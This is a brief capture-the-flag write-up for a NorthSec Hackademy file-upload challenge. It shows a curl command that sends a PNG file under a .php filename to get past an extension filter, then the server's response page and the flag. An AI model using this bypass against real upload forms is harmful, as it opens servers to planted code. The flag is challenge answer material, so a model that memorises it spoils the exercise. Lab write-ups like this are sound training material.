# Upload 102

We send the file as if it was a PNG file:   
``curl -F "file=@upload2.png;filename=upload2.php" chal8.hackademy.ctf/upload2.php``

```
<!DOCTYPE html>
<html>
    <head>
        <title>NorthSec Hackademy</title>
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.5.1.js"></script>
        <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
        <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    </head>
    <body>
        <div class="container">
            <!-- HINT: Your file will not be uploaded for real. If you successfully upload a PHP file that would be interpreted by the web server, you will receive the flag. -->
            <form action="" method="POST" enctype="multipart/form-data">
                <h1>Send us your file.</h1>
                <p>Only PNG, JPG and JPEG are allowed.</p>
                <input type="file" name="file">
                <input class="btn btn-primary" type="submit" name="submit" value="Upload">
                <div class="alert alert-success">You have successfully uploaded your file.<br>FLAG-hJFasjrdoTPMNXUW7floA9nib8g5VwH0</div>            </form>
        </div>
    </body>
</html>%
```   

``FLAG-hJFasjrdoTPMNXUW7floA9nib8g5VwH0``
